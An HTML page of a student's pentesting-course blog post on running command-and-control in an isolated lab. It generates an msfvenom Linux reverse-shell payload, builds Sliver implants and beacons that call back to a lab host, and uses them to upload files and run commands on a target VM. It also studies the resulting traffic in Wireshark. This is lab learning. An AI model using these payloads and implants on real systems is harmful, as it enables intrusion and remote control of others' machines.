<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="">
<meta name="description" content=" a) Sniffing the venom Establishing the connection and packet capture Like usual, I check to make sure the virtual machines are off the internet and communicate with each other fine. Nothing has changed in the setup so everything is working a ok.
I open up wireshark and start capturing traffic.
I am going to use the same payload I used in H5 which was as follows: msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e generic/none -f elf and remembering to open a port with sudo ufw allow 4444/tcp.
" />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="https://tuukkaani.github.io/tuukkaani-blog/pentesting-course/h6/" />


    <title>
        
            H6 - C2 with sliver and metasploit :: tuukkaani-blog 
        
    </title>





  <link rel="stylesheet" href="/tuukkaani-blog/main.min.2729760c629597024c5de34b40ea9f372f2b5a2a192dcdca537b7ddfa483eab8.css" integrity="sha256-Jyl2DGKVlwJMXeNLQOqfNy8rWioZLc3KU3t936SD6rg=" crossorigin="anonymous">





    <link rel="apple-touch-icon" sizes="180x180" href="/tuukkaani-blog/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/tuukkaani-blog/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/tuukkaani-blog/favicon-16x16.png">
    <link rel="manifest" href="/tuukkaani-blog/site.webmanifest">
    <link rel="mask-icon" href="/tuukkaani-blog/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="/tuukkaani-blog/favicon.ico">
    <meta name="msapplication-TileColor" content="">



  <meta itemprop="name" content="H6 - C2 with sliver and metasploit">
  <meta itemprop="description" content="a) Sniffing the venom Establishing the connection and packet capture Like usual, I check to make sure the virtual machines are off the internet and communicate with each other fine. Nothing has changed in the setup so everything is working a ok.
I open up wireshark and start capturing traffic.
I am going to use the same payload I used in H5 which was as follows: msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e generic/none -f elf and remembering to open a port with sudo ufw allow 4444/tcp.">
  <meta itemprop="datePublished" content="2025-10-02T00:00:00+00:00">
  <meta itemprop="dateModified" content="2025-10-02T00:00:00+00:00">
  <meta itemprop="wordCount" content="1037">
  <meta itemprop="keywords" content="Pentesting-Course">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="H6 - C2 with sliver and metasploit">
  <meta name="twitter:description" content="a) Sniffing the venom Establishing the connection and packet capture Like usual, I check to make sure the virtual machines are off the internet and communicate with each other fine. Nothing has changed in the setup so everything is working a ok.
I open up wireshark and start capturing traffic.
I am going to use the same payload I used in H5 which was as follows: msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e generic/none -f elf and remembering to open a port with sudo ufw allow 4444/tcp.">





    <meta property="article:section" content="pentesting-course" />



    <meta property="article:published_time" content="2025-10-02 00:00:00 &#43;0000 UTC" />












    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="/tuukkaani-blog/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">></span>
            <span class="logo__text ">
                Hello there!</span>
            <span class="logo__cursor" style=
                  "
                   background-color:#00ffcc;
                   animation-duration:1.5s;">
            </span>
        
    </div>
</a>


        <span class="header__right">
                <nav class="menu">
    <ul class="menu__inner"><li><a href="/tuukkaani-blog/">Home</a></li><li><a href="/tuukkaani-blog/pentesting-course/">Pentesting Course</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            
            </p>
        </div>

        <article>
            <h2 class="post-title"><a href="https://tuukkaani.github.io/tuukkaani-blog/pentesting-course/h6/">H6 - C2 with sliver and metasploit</a></h2>

            
            
            

            <div class="post-content">
                <hr>
<h3 id="a-sniffing-the-venom">a) Sniffing the venom</h3>
<h4 id="establishing-the-connection-and-packet-capture">Establishing the connection and packet capture</h4>
<p>Like usual, I check to make sure the virtual machines are off the internet and communicate with each other fine. Nothing has changed in the setup so everything is working a ok.</p>
<p>I open up wireshark and start capturing traffic.</p>
<p>I am going to use the same payload I used in H5 which was as follows:
<code>msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e generic/none -f elf</code> and remembering to open a port with <code>sudo ufw allow 4444/tcp</code>.</p>
<p>Then I launch <code>msfconsole</code> and set all the parameters to match the payload and start the listening session with <code>exploit</code>.</p>
<p>To establish the connection, I go to the target machine (ms2 vm) and
run the program.</p>
<p><img src="/tuukkaani-blog/img/h6/msfconsole.png" alt="Msfconsole"></p>
<h4 id="going-through-packet-captures">Going through packet captures</h4>
<p>Checking into wireshark and stopping the capture, I filter with
<code>tcp.port==4444</code> as that is the port I decided to use. With that I can see the captured traffic between the host and target:</p>
<p><img src="/tuukkaani-blog/img/h6/wireshark_venom.png" alt="Wirkeshark msfvenom"></p>
<p>The port 4444 here raises some alarms as it is commonly used by metasploit for reverse shell connections.</p>
<hr>
<h3 id="b-creating-a-http-connection-with-sliver">b) Creating a http connection with sliver</h3>
<h4 id="sliver-installation">Sliver installation</h4>
<p>Firstly, I&rsquo;m installing sliver on my kali machine. The sliver github provides a single liner install <code>curl https://sliver.sh/install|sudo bash</code>. Trust me bro. During the installation, I was not clearly prompted for password at first, but if it seems to be stuck for you after running the one liner, just hit enter couple times and it should prompt you. After which running <code>sliver</code> should open up the program. <a href="https://github.com/BishopFox/sliver">(Sliver Github 2025.)</a></p>
<p><img src="/tuukkaani-blog/img/h6/sliver.png" alt="Sliver"></p>
<p>And it does! Ain&rsquo;t it like giga cool (ofhell).</p>
<p>Note: it is october 2. 2025 and this is the v1.5.43 instead of the newer, but unfinished 1.6 build, so if in the future some of the functionality here is due to change.</p>
<h4 id="establishing-connection-with-sliver">Establishing connection with sliver</h4>
<p>So I setup wireshark in the background to capture packets. I am capturing <em>eth0</em> which is the interface I use for offline testing while <em>eth1</em> uses my actual eth to connect to the internet. This is the same setup as the previous section. Just wanted to mention it here.</p>
<p><img src="/tuukkaani-blog/img/h6/ipa.png" alt="Ip a"></p>
<p>Now, I familiarize myself with sliver by going over their provided getting started tutorial, which if I remember correctly does what I want to achieve here: establishing a http connection between the host and target.</p>
<p>So first I need to generate our implant which is the name sliver uses for malicious code run on the target machine <a href="https://sliver.sh/docs?name=Architecture">(Sliver 2025. Architecture.)</a>.</p>
<p>I used the following command to generate the implant:
<code>generate -b 10.10.10.10 --os linux --skip-symbols --debug</code></p>
<p><img src="/tuukkaani-blog/img/h6/implant.png" alt="Implant"></p>
<p>Next I ran the implant on the target machine, which is Debian13 machine running in the same network.</p>
<p><img src="/tuukkaani-blog/img/h6/implant_target.png" alt="Implant at target"></p>
<p>Using <code>sessions</code> we can see that our session has been established to the target machine:</p>
<p><img src="/tuukkaani-blog/img/h6/session.png" alt="Sliver session"></p>
<p>Lastly I run <code>use</code> and select the proper implant and <code>pwd</code> to see I am actually in the target machine:</p>
<p><img src="/tuukkaani-blog/img/h6/target.png" alt="Target"></p>
<p><a href="https://sliver.sh/tutorials">(Sliver 2025. Tutorials.)</a></p>
<hr>
<h3 id="c-sniffing-the-sliver-hihihihihihi">c) Sniffing the sliver (<em>hihihihihihi</em>)</h3>
<p>In the very short time I had the connection, I already have quite the wall in wireshark to look at:</p>
<p><img src="/tuukkaani-blog/img/h6/wireshark_sliver.png" alt="Wireshark sliver"></p>
<p>A lot of weird GET requests in fast intervals. Just the amount from a single address is quite concerning and the requests themselves don&rsquo;t help.</p>
<hr>
<h3 id="d-modifing-the-connection-in-sliver">d) Modifing the connection in sliver.</h3>
<p>So it would be beneficial if we could at least limit the calling home to be less&hellip; obsessive. Luckily there is a way to do just that. In the <a href="https://sliver.sh/tutorials?name=2+-+Beacons+vs+Sessions">sliver.sh&rsquo;s beacons vs sessions tutorial</a> some of these methods are used, and that is what I am going to be doing as well.</p>
<p>The tutorial mentions sessions being a single constantly maintained TCP connection, while beacons can call home every so often.
<a href="https://sliver.sh/tutorials?name=2+-+Beacons+vs+Sessions">(Sliver 2025. Beacons vs Sessions.)</a></p>
<p>So firstly we will create a new beacon with this in mind:</p>
<p><code>generate beacon -b 10.10.10.10 --os linux -j 5 -S 15 --skip-symbols --debug --save cockball_the_movie_starring_ben_stiller</code></p>
<p>I decided to make the executable more&hellip; <em>executable</em> by giving it an enticing name. Maybe more importantly, it was given the flags <code>-j 5</code> and <code>-S 15</code>. What I could gather from the documentation <a href="https://sliver.sh/docs?name=Getting%20Started">sliver getting started.</a>, -S stands for how often the beacon should callback in seconds. -j stands for jitter and adds a random delay in seconds to the callback. <a href="https://sliver.sh/docs?name=Getting%20Started">(Sliver 2025. Getting Started.)</a></p>
<p>So time to test it out. I run the executable on the target machine:</p>
<p><img src="/tuukkaani-blog/img/h6/target2.png" alt="Target"></p>
<p>Oh no! It seems you can&rsquo;t trust anything these days!!! Oh well. We get a callback from the beacon:</p>
<p><img src="/tuukkaani-blog/img/h6/beacons.png" alt="Beacons"></p>
<p>Here we can see the last check-in and the next one. Time to check out what wireshark has in store for us!</p>
<p><img src="/tuukkaani-blog/img/h6/dummy.png" alt="L + n00b"></p>
<p>Oopsie. Well I guess I&rsquo;ll have to let it run for couple of minutes.</p>
<p><img src="/tuukkaani-blog/img/h6/wireshark_sliver2.png" alt="Wireshark sliver 2"></p>
<p>Now the calls are much less frequent and come at varying times.</p>
<p><a href="https://sliver.sh/tutorials?name=2+-+Beacons+vs+Sessions">(Sliver 2025. Beacons vs Sessions.)</a></p>
<hr>
<h3 id="e-using-slivers-different-functionalities">e) Using sliver&rsquo;s different functionalities.</h3>
<p>I begin by using the beacon with <code>use</code> and finishing off the name with tab:</p>
<p><img src="/tuukkaani-blog/img/h6/tab.png" alt="Beacon use"></p>
<p>With <code>help</code> I can start checking out what kind of things I am able to do. Lets see if I can make the user&rsquo;s wallpaper to be a picture of Ben Stiller.</p>
<p>So I first need to get the picture to the target machine using the command <code>upload ben.png /home/user/Pictures/ben.png</code> which uploads file ben.png from our host to the target&rsquo;s Pictures directory:</p>
<p><img src="/tuukkaani-blog/img/h6/ben.png" alt="Ben">
Image can be found here: <a href="https://www.theguardian.com/film/filmblog/2015/aug/03/zoolander-2-teaser-trailer-ben-stiller">(Benjamin Lee 2015.)</a></p>
<p>Next I need to change the Ben to be the wallpaper, I know the target uses gnome, so with a quick google I found a AskUbuntu post that gives me the command needed <a href="https://askubuntu.com/questions/66914/how-to-change-desktop-background-from-command-line-in-unity">(AskUbuntu 2011.)</a>:</p>
<p><code>execute gsettings set org.gnome.desktop.background picture-uri file:///home/user/Pictures/ben.png</code></p>
<p>Now, did my magnificent plan work? One could probably use sliver to take a screenshot, but found it only prints black squares on my vm, which might have something to do with displays etc. So here is a manual screenshot of the target:</p>
<p><img src="/tuukkaani-blog/img/h6/ohboy.png" alt="Oh boy"></p>
<p>Now look at that! Amazing, truly!</p>
<hr>
<h3 id="sources">Sources</h3>
<p>All the assignments this page is based on can be found at <a href="https://terokarvinen.com/tunkeutumistestaus/">Tero Karvinen</a></p>
<p><a href="https://github.com/BishopFox/sliver">Sliver Github 2025.</a></p>
<p><a href="https://sliver.sh/tutorials">Sliver 2025. Tutorials.</a></p>
<p><a href="https://sliver.sh/docs?name=Architecture">Sliver 2025. Architecture.</a></p>
<p><a href="https://sliver.sh/tutorials?name=2+-+Beacons+vs+Sessions">Sliver 2025. Beacons vs Sessions.</a>
<a href="https://sliver.sh/docs?name=Getting%20Started">Sliver 2025. Getting Started.</a></p>
<p><a href="https://www.theguardian.com/film/filmblog/2015/aug/03/zoolander-2-teaser-trailer-ben-stiller">Benjamin Lee 2015. Long catwalk home: can Ben Stiller make audiences care about Zoolander 2?</a>
<a href="https://askubuntu.com/questions/66914/how-to-change-desktop-background-from-command-line-in-unity">AskUbuntu 2011. How to change desktop background from command line in Unity</a></p>

            </div>
        </article>

        <hr />

        <div class="post-info">
            
            
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>

        <span class="tag"><a href="https://tuukkaani.github.io/tuukkaani-blog/categories/pentesting-course/">pentesting-course</a></span>
        
    </p>

  		</div>
    </main>

            </div>

            
                <footer class="footer">
    
    
</footer>

            
        </div>

        



<script type="text/javascript" src="/tuukkaani-blog/bundle.min.ad54ad97364f77ede35def9096b162bb1f0b3973aa50b080f5e82fa147f6882e2a7200d7535adbf9b51bebf939f1c1ca9bbe6be87530092aca720eac4a226fda.js" integrity="sha512-rVStlzZPd&#43;3jXe&#43;QlrFiux8LOXOqULCA9egvoUf2iC4qcgDXU1rb&#43;bUb6/k58cHKm75r6HUwCSrKcg6sSiJv2g=="></script>




    </body>
</html>
